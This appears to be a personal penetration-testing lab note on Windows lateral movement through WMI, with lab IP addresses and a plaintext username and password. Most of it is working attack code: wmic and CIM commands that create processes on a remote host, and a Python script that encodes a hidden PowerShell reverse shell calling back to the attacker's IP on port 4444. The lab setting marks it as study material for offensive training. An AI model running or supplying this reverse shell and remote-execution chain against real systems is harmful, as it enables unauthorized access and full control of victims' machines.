---
IP_KALI: 192.168.45.155
IP_FILES04: 192.168.179.72
USER: jen
PASSWD: Nexus123!
---
Requirements:
-  credentials of a member of the _Administrators_ local group
 
Procedure:
- WMI is capable of creating processes via the _Create_ method from the _Win32_Process_ class. It communicates through [_Remote Procedure Calls_](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page) (RPC) over port 135 for remote access and uses a higher-range port (19152-65535) for session data.
	- wmic /node:<span id="IP_FILES04"/>192.168.179.72<span type="end"/> /user:<span id="USER"/>jen<span type="end"/> /password:<span id="PASSWD"/>Nexus123!<span type="end"/> process call create "calc"

Python script to encode powershell reverse shell:
```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.155",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
Translating wmic attack into powershell syntax:
- $username = '<span id="USER"/>jen<span type="end"/>';
- $password = '<span id="PASSWD"/>Nexus123!<span type="end"/>';
```
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
```
```
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```
```
$options = New-CimSessionOption -Protocol DCOM
```
- $session = New-Cimsession -ComputerName <span id="IP_FILES04"/>192.168.179.72<span type="end"/> -Credential $credential -SessionOption $Options 
```
$command = 'powershell -nop -w hidden -e 
';
```
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

NOTE: WinRM can be employed as an alternative in the case that the above doesn't work, see section 23.1.1
